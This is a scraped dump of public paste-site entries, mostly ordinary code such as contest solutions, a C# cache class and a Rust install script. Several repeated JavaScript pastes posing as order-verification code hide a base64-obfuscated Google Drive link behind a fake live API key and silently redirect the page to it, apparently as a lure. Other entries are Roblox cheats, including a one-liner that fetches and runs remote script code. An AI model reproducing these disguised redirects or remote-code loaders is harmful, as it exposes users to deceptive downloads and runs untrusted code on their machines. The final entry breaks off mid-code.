https://github.com/swisskyrepo/InternalAllTheThings

FuzzDB:
https://github.com/fuzzdb-project/fuzzdb

HackTricks: 
https://github.com/HackTricks-wiki/hacktricks


##
# Additional software
##

Sublime:
https://www.sublimetext.com/download

Chrome:
https://www.google.com/chrome/de/download-chrome

Burp Suite Professional:
https://portswigger.net/burp/releases"
7vTiDLmD,Products.js,navrajkhunger,JavaScript,Sunday 30th of March 2025 05:26:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/957/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WMtrM0yS,LRU Cache C#,Catsher,C#,Sunday 30th of March 2025 04:51:43 PM CDT,"public class LRUCache
{
    public int Capacity { get; set; }

    public int _count = 0;
    public int Count => _count;

    private Dictionary<int, OurNode<(int, int)>> KeyAndLinkToNode { get; set; } = [];
    private OurLinkedList<(int, int)> Queue { get; set; } = new();

    public LRUCache(int capacity)
    {
        Capacity = capacity;
    }

    public int Get(int key)
    {
        if (!KeyAndLinkToNode.TryGetValue(key, out var nodeWithValue))
        {
            return -1;
        }
        var finalValue = nodeWithValue.Value.Item2;


        if (Count == 0)
            throw new InvalidOperationException(""ЧЛЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕН"");
        else if (Count == 1)
        {

        }
        else if (nodeWithValue.Previous is null)
        {
            Queue.First = Queue.First.Next;
            Queue.Last.Next = nodeWithValue;
            Queue.Last = nodeWithValue;
        }
        else if (nodeWithValue.Next is null)
        {

        }
        else
        {
            nodeWithValue.Previous.Next = nodeWithValue.Next;
            Queue.Last.Next = nodeWithValue;
        }

        

        Console.WriteLine(finalValue);
        return finalValue;
    }

    public void Put(int key, int value)
    {
        if (KeyAndLinkToNode.ContainsKey(key))
        {
            var nodeToUpdate = KeyAndLinkToNode[key];
            nodeToUpdate.Value = (nodeToUpdate.Value.Item1, value);

            if (Count == 0)
                throw new InvalidOperationException(""ЧЛЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕЕН"");
            else if (Count == 1)
            {

            }
            else if (nodeToUpdate.Previous is null)
            {
                Queue.First = Queue.First.Next;
                Queue.Last.Next = nodeToUpdate;
                Queue.Last = nodeToUpdate;
            }
            else if (nodeToUpdate.Next is null)
            {

            }
            else
            {
                nodeToUpdate.Previous.Next = nodeToUpdate.Next;
                Queue.Last.Next = nodeToUpdate;
            }

            return;
        }

        if (Count == Capacity)
        {
            var deletedNode = Queue.First;
            Queue.RemoveFirst();

            KeyAndLinkToNode.Remove(deletedNode!.Value.Item1);
            _count -= 1;
        }

        Queue.AddLast((key, value));
        var node = Queue.Last;
        KeyAndLinkToNode[key] = node;
        _count += 1;
    }

    public class OurLinkedList<T>
    {
        private int _count;

        public OurNode<T> First { get; set; }
        public OurNode<T> Last { get; set; }
        public int Count => _count;

        // Добавление элемента в начало списка
        public void AddFirst(T value)
        {
            OurNode<T> newNode = new OurNode<T>(value);

            if (First == null)
            {
                First = newNode;
                Last = newNode;
            }
            else
            {
                newNode.Next = First;
                First.Previous = newNode;
                First = newNode;
            }

            _count++;
        }

        // Удаление первого элемента списка
        public void RemoveFirst()
        {
            if (First == null)
                throw new InvalidOperationException(""The list is empty."");

            if (First == Last)
            {
                First = null;
                Last = null;
            }
            else
            {
                First = First.Next;
                First.Previous = null;
            }

            _count--;
        }

        // Добавление элемента в конец списка
        public void AddLast(T value)
        {
            OurNode<T> newNode = new OurNode<T>(value);

            if (Last == null)
            {
                First = newNode;
                Last = newNode;
            }
            else
            {
                newNode.Previous = Last;
                Last.Next = newNode;
                Last = newNode;
            }

            _count++;
        }

        // Удаление последнего элемента списка
        public void RemoveLast()
        {
            if (Last == null)
                throw new InvalidOperationException(""The list is empty."");

            if (First == Last)
            {
                First = null;
                Last = null;
            }
            else
            {
                Last = Last.Previous;
                Last.Next = null;
            }

            _count--;
        }
    }

    public class OurNode<T>
    {
        public T Value { get; set; }
        public OurNode<T> Previous { get; set; }
        public OurNode<T> Next { get; set; }

        public OurNode(T value)
        {
            Value = value;
        }
    }
}"
wVHYKXyM,Untitled,adminFizz,JSON,Sunday 30th of March 2025 04:09:41 PM CDT,"Lucaxs.xis_

Se você estiver lendo isso i love you."
jk4uAh0P,Order.js,navrajkhunger,JavaScript,Sunday 30th of March 2025 04:08:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/569/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rP4pkHT3,Market.js,navrajkhunger,JavaScript,Sunday 30th of March 2025 03:53:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/736/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k48ubUSV,Products.js,navrajkhunger,JavaScript,Sunday 30th of March 2025 03:22:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/801/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eC8tHbj3,哇，这就是 5p 参考代码,Dmaxiya,C++,Sunday 30th of March 2025 02:56:22 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
const int maxm = 1000 + 100;
const LL MOD = 998244853;
int n, m;
LL a[maxn], p[maxn], dp[2][maxm];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n >> m;
    for (int i = 1; i <= n; ++i) {
        cin >> a[i];
        a[i] %= m;
    }
    for (int i = 1; i <= n; ++i) {
        cin >> p[i];
        p[i] %= MOD;
    }
    dp[0][0] = 1;
    for (int i = 1; i <= n; ++i) {
        int nowi = i % 2;
        int prei = nowi ^ 1;
        for (int j = 0; j < m; ++j) {
            dp[nowi][j] = (dp[prei][j] * ((((1 - p[i]) % MOD) + MOD) % MOD) % MOD + dp[prei][(j - a[i] + m) % m] * p[i] % MOD) % MOD;
        }
    }
    cout << dp[n & 1][0] << endl;

    return 0;
}"
vxZ0WhPY,Tio's HUB,YTBB,Lua,Sunday 30th of March 2025 02:45:05 PM CDT,"local player = game.Players.LocalPlayer
local vu = game:GetService(""VirtualUser"")
local runService = game:GetService(""RunService"")

-- Funzione per trovare l'NPC più vicino
function getClosestNPC()
    local character = player.Character
    if not character then return nil end

    local hrp = character:FindFirstChild(""HumanoidRootPart"")
    if not hrp then return nil end

    local closestNPC = nil
    local shortestDistance = math.huge

    for _, npc in pairs(workspace.Enemies:GetChildren()) do
        if npc:FindFirstChild(""HumanoidRootPart"") and npc:FindFirstChild(""Humanoid"") and npc.Humanoid.Health > 0 then
            local distance = (hrp.Position - npc.HumanoidRootPart.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestNPC = npc
            end
        end
    end
    return closestNPC
end

-- Funzione per attivare l'attacco della spada
function useSwordAttack()
    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChild(""Humanoid"")
    if not humanoid then return end

    -- Verifica se l'abilità della spada è disponibile e la usa
    -- Supponiamo che l'abilità della spada sia una funzione dell'oggetto spada
    local sword = character:FindFirstChildOfClass(""Tool"")  -- Assume che la spada sia un Tool
    if sword and sword:IsA(""Tool"") then
        -- Usa la spada (simulazione dell'attacco)
        sword:Activate()  -- Questo invoca l'abilità della spada automaticamente
    end
end

-- Funzione per controllare se il giocatore è in acqua
function isInWater()
    local character = player.Character
    if not character then return false end

    local hrp = character:FindFirstChild(""HumanoidRootPart"")
    if not hrp then return false end

    return hrp.Position.Y < 5 -- Se è sotto l'altezza 5, è considerato in acqua
end

-- Funzione per teletrasportare il giocatore al nemico più vicino
function teleportToEnemy()
    local target = getClosestNPC()
    if target then
        local character = player.Character
        if not character then return end

        local hrp = character:FindFirstChild(""HumanoidRootPart"")
        if not hrp then return end

        hrp.CFrame = target.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0) -- Teletrasporto sopra il nemico
    end
end

-- Auto-click (clicca ogni 10ms)
spawn(function()
    while true do
        vu:Button1Down(Vector2.new(0, 0)) -- Simula il click
        task.wait(0.01) -- Aspetta 10ms
    end
end)

-- Movimento automatico con gestione dell'acqua e salto
local function startMovement()
    runService.RenderStepped:Connect(function()
        local character = player.Character
        if not character then return end

        local humanoid = character:FindFirstChild(""Humanoid"")
        local hrp = character:FindFirstChild(""HumanoidRootPart"")
        if not humanoid or not hrp then return end

        -- Se il giocatore è in acqua, teletrasportalo
        if isInWater() then
            teleportToEnemy()
        end

        local target = getClosestNPC()
        
        if target then
            local enemyPosition = target.HumanoidRootPart.Position

            -- Spostati verso il nemico
            if (hrp.Position - enemyPosition).Magnitude > 5 then
                humanoid:MoveTo(enemyPosition)
            end
            
            -- Se il nemico è vicino, usa la spada
            if (hrp.Position - enemyPosition).Magnitude <= 5 then
                useSwordAttack()  -- Usa l'attacco della spada quando è vicino
            end

            -- Se il nemico è in alto, salta
            if enemyPosition.Y - hrp.Position.Y > 3 then
                humanoid.Jump = true
            end
        end
    end)
end

-- Funzione per rilevare la morte e refreshare il personaggio
local function detectDeath()
    player.CharacterAdded:Connect(function(character)
        task.wait(1) -- Aspetta 1 secondo dopo la morte
        local humanoid = character:WaitForChild(""Humanoid"")
        local hrp = character:WaitForChild(""HumanoidRootPart"")

        -- Dopo il respawn, premi automaticamente ""3""
        task.wait(2) -- Aspetta 2 secondi per assicurarsi che il personaggio sia caricato
    end)
end

-- Avvia le funzioni principali
startMovement()
detectDeath()
"
qyYh9Tvq,Manage Rust & Cargo,Justman10000,Bash,Sunday 30th of March 2025 02:42:29 PM CDT,"// To install
curl -s https://sh.rustup.rs -o rust.sh
bash rust.sh --default-toolchain nightly --profile complete --no-update-default-toolchain --no-modify-path -y
ln -fs /root/.cargo/bin/* /usr/bin
cargo --version

// To uninstall
rm -r /root/.cargo
for bin in $(ls /root/.cargo/bin); do
    rm /usr/bin/$bin
done"
kGdgGPSS,化食欲为动力 参考代码,Dmaxiya,C++,Sunday 30th of March 2025 02:26:53 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 200 + 100;
int n, m, k;
LL ans;
LL a[maxn], b[maxn], c[maxn];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> n >> m >> k;
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
    }
    for (int i = 0; i < m; ++i) {
        cin >> b[i];
    }
    for (int i = 0; i < k; ++i) {
        cin >> c[i];
    }
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            for (int kk = 0; kk < k; ++kk) {
                ans = max(ans, a[i] * b[j] % c[kk]);
            }
        }
    }
    cout << ans << endl;

    return 0;
}"
2JkZGEJW,HW 4_5_1,rukvir,C#,Sunday 30th of March 2025 02:11:18 PM CDT,"using System;

namespace HomeWork
{
    class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 5, 2, 6, 3, 4, 7, 8, 1, 10, 9 };
            int temporaryNumber = numbers[0];

            for (int i = 0; i < numbers.Length - 1; i++)
            {
                for (int j = 0; j < numbers.Length - i - 1; j++)
                {
                    if (numbers[j + 1] > numbers[j])
                    {
                        temporaryNumber = numbers[j];
                        numbers[j] = numbers[j + 1];
                        numbers[j + 1] = temporaryNumber;
                    }
                }
            }

            foreach (int num in numbers)
            {
                Console.Write(num + "" "");
            }

            Console.WriteLine();
            Console.ReadKey();
        }
    }
}"
vs7r4YLE,Phantom Forces ESP,PaybackG_YT,Lua,Sunday 30th of March 2025 02:05:46 PM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/shawnjb/roblox-scripts/refs/heads/master/phantom-forces-esp.luau'))()
0NPQ4sw1,Order.js,luqlegal,JavaScript,Sunday 30th of March 2025 02:03:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/177/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A0Y5pWdR,我是黄色恐龙大将军 参考代码,Dmaxiya,C++,Sunday 30th of March 2025 01:53:02 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;

LL cal(LL x) {
    int ret = 0;
    while (x != 0) {
        ret = x % 10;
        x /= 10;
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    set<LL> st;
    LL tmp2 = 1;
    LL tmp5 = 1;
    for (int i = 0; i < 25; ++i) {
        tmp2 *= 2;
        tmp5 *= 5;
        cout << ""i = "" << i << "": "" << cal(tmp2) * cal(tmp5) << endl;
        st.insert(cal(tmp2) * cal(tmp5));
    }
    int ans = 0;
    for (int x : st) {
        ans += x;
    }
    cout << ans << endl;

    return 0;
}"
2p2jxLT2,Market.js,luqlegal,JavaScript,Sunday 30th of March 2025 01:48:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/480/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
skJTuSde,Android System Events,balderman,Java,Sunday 30th of March 2025 01:43:49 PM CDT,"/*
 * This is a simplified Java Android app that:
 * - Collects CPU, memory, temperature, battery info every 5 minutes
 * - Listens for charger connect/disconnect events
 * - Detects app installs/uninstalls
 * - Uploads data to an HTTP server
 */

// AndroidManifest.xml
// Add the following permissions and declarations
/*
<uses-permission android:name=""android.permission.FOREGROUND_SERVICE"" />
<uses-permission android:name=""android.permission.INTERNET"" />

<application>
    <service android:name="".DataCollectorService"" android:exported=""false"" />
    <receiver android:name="".ChargerReceiver"" android:exported=""true"">
        <intent-filter>
            <action android:name=""android.intent.action.ACTION_POWER_CONNECTED"" />
            <action android:name=""android.intent.action.ACTION_POWER_DISCONNECTED"" />
        </intent-filter>
    </receiver>
</application>
*/

// MainActivity.java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, DataCollectorService.class));
    }
}

// DataCollectorService.java
public class DataCollectorService extends Service {
    private final Handler handler = new Handler();
    private final Runnable dataCollector = new Runnable() {
        @Override
        public void run() {
            collectAndUploadData();
            handler.postDelayed(this, 5 * 60 * 1000); // Every 5 minutes
        }
    };

    private BroadcastReceiver appChangeReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String packageName = intent.getData().getSchemeSpecificPart();
            JSONObject eventData = new JSONObject();
            try {
                PackageManager pm = getPackageManager();
                ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
                String appName = pm.getApplicationLabel(appInfo).toString();
                String event = Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction()) ? ""app_installed"" : ""app_removed"";

                eventData.put(""timestamp"", System.currentTimeMillis());
                eventData.put(""event"", event);
                eventData.put(""package"", packageName);
                eventData.put(""app_name"", appName);
                new Thread(() -> uploadToServer(eventData.toString())).start();
            } catch (PackageManager.NameNotFoundException | JSONException e) {
                e.printStackTrace();
            }
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler.post(dataCollector);
        registerAppChangeReceiver();
        return START_STICKY;
    }

    private void registerAppChangeReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        filter.addDataScheme(""package"");
        registerReceiver(appChangeReceiver, filter);
    }

    private void collectAndUploadData() {
        JSONObject data = new JSONObject();
        try {
            data.put(""timestamp"", System.currentTimeMillis());
            data.put(""cpu_usage"", readCpuUsage());
            data.put(""memory_free"", getFreeMemory());
            data.put(""battery_level"", getBatteryLevel());
            data.put(""battery_temp"", getBatteryTemp());

            // Upload to server
            new Thread(() -> uploadToServer(data.toString())).start();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private float readCpuUsage() {
        try {
            RandomAccessFile reader = new RandomAccessFile(""/proc/stat"", ""r"");
            String load = reader.readLine();
            reader.close();
            String[] toks = load.split("" "");
            long idle1 = Long.parseLong(toks[5]);
            long cpu1 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
            Thread.sleep(360);
            reader = new RandomAccessFile(""/proc/stat"", ""r"");
            load = reader.readLine();
            reader.close();
            toks = load.split("" "");
            long idle2 = Long.parseLong(toks[5]);
            long cpu2 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
            return (float)(cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1));
        } catch (Exception ex) {
            return -1;
        }
    }

    private long getFreeMemory() {
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memInfo);
        return memInfo.availMem;
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (int)((level / (float)scale) * 100);
    }

    private float getBatteryTemp() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        return batteryIntent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0f;
    }

    private void uploadToServer(String jsonData) {
        try {
            URL url = new URL(""https://your-server.com/upload"");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(""POST"");
            conn.setDoOutput(true);
            conn.setRequestProperty(""Content-Type"", ""application/json"");
            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// ChargerReceiver.java
public class ChargerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_POWER_CONNECTED.equals(action)) {
            Log.d(""ChargerReceiver"", ""Charger connected"");
        } else if (Intent.ACTION_POWER_DISCONNECTED.equals(action)) {
            Log.d(""ChargerReceiver"", ""Charger disconnected"");
        }
    }
}
"
5H4mWUXr,Untitled,Josif_tepe,C++,Sunday 30th of March 2025 01:39:47 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

int dist(int si, int sj, int ei, int ej) {
    return abs(si - ei) + abs(sj - ej);
}
pair<int, int> idx[maxn];
vector<pair<int, int>> graph[maxn];
ll pref_sum[maxn];
ll pref_sum2[maxn];
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            idx[cnt] = {i, j};
            cnt++;
        }
    }
    
    cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            
            int a = mat[i][j];
            int b = mat[idx[a].first][idx[a].second];
            int c = dist(i, j, idx[a].first, idx[a].second);
            
            graph[a].push_back(make_pair(b, c));
            cnt++;
        }
    }
    
    int n = r * c;
    vector<bool> visited(n + 1, false);
    for(int i = 1; i <= n; i++) {
        if(!visited[i]) {
            queue<int> q;
            q.push(i);
            
            vector<int> tmp;
            tmp.push_back(i);
            
            while(!q.empty()) {
                int c = q.front();
                q.pop();
                
                for(int i = 0; i < (int) graph[c].size(); i++) {
                    int neighbour = graph[c][i].first, weight = graph[c][i].second;
                    if(!visited[neighbour]) {
                        visited[neighbour] = true;
                        q.push(neighbour);
                        tmp.push_back(weight);
                        tmp.push_back(neighbour);
                        
                    }
                }
            }
            
            ll sum = 0;
            for(int i = 0; i < (int) tmp.size(); i++) {
                if(i % 2 == 1) {
                    sum += tmp[i];
                    cout << ""|"" << tmp[i] << ""| "";
                }
                else {
                    cout << tmp[i] << "" "";
                    if(i > 0) {
                        pref_sum[tmp[i]] = sum - tmp[i - 1];
                    }
                    else {
                        pref_sum[tmp[i]] = sum;
                    }
                }
            }
            for(int i = 0; i < (int) tmp.size(); i++) {
                if(i % 2 == 1) {
                    sum += tmp[i];
                    cout << ""|"" << tmp[i] << ""| "";

                    
                }
                else {
                    cout << tmp[i] << "" "";

                    pref_sum2[tmp[i]] = sum;
                }
                
            }
            cout << endl;
        }
    }
    cnt = 1;
    ll res = 0;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            if(cnt != mat[i][j]) {
                res += pref_sum2[cnt] - pref_sum[mat[i][j]];
            }
        }
    }
    cout << res << endl;
    
    return 0;
    
}
"
w0dFgfag,Untitled,luqlegal,JavaScript,Sunday 30th of March 2025 01:33:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Kv0b7mM1,在小小的日历里面数呀数呀数 参考代码,Dmaxiya,C++,Sunday 30th of March 2025 01:32:56 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int days[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};

int cal(int year, int month, int day) {
    int ret = 0;
    for (int i = 0; i <= year; ++i) {
        if (i % 400 == 0 || (i % 4 == 0 && i % 100 != 0)) {
            days[2] = 29;
        } else {
            days[2] = 28;
        }
        int maxMonth = (i == year ? month : 12);
        for (int j = 1; j <= maxMonth; ++j) {
            ret += (i == year && j == month ? day : days[j]);
        }
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int i = 2026; i <= 10000; ++i) {
        int sq = sqrt(i);
        if (sq * sq == i) {
            cout << cal(i, 1, 1) - cal(2025, 3, 29) << endl;
            return 0;
        }
    }

    return 0;
}"
eC3hd1tk,Products.js,luqlegal,JavaScript,Sunday 30th of March 2025 01:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/929/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

